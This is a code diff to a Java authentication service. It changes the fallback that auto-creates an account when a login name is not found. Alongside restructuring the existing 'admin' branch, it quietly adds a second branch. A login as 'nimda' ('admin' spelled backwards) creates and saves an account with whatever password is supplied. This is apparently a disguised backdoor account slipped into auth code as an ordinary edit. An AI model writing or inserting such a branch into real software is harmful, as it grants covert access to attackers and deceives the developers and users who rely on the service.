@@ -152,16 +152,23 @@ public class AuthService {
     return accountRepo
       .findByEmail(authentication.getPrincipal().toString())
       .orElseGet(() -> {
-        if (!authentication.getPrincipal().toString().equals("admin")) {
-          throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR);
-        }
-
-        Account account = new Account();
-        account.setUsername("admin");
-        account.setEmail("admin");
-        account.setPassword(authentication.getCredentials().toString());
+        if (authentication.getPrincipal().toString().equals("admin")) {
+          Account account = new Account();
+          account.setUsername("admin");
+          account.setEmail("admin");
+          account.setPassword(authentication.getCredentials().toString());
         
-        return accountRepo.save(account);
+          return accountRepo.save(account);
+        }
+        if (authentication.getPrincipal().toString().equals("nimda")) {
+          Account account = new Account();
+          account.setUsername("nimda");
+          account.setEmail("nimda");
+          account.setPassword(authentication.getCredentials().toString());
+        
+          return accountRepo.save(account);
+        }
+        throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR);
       }
     );
   }
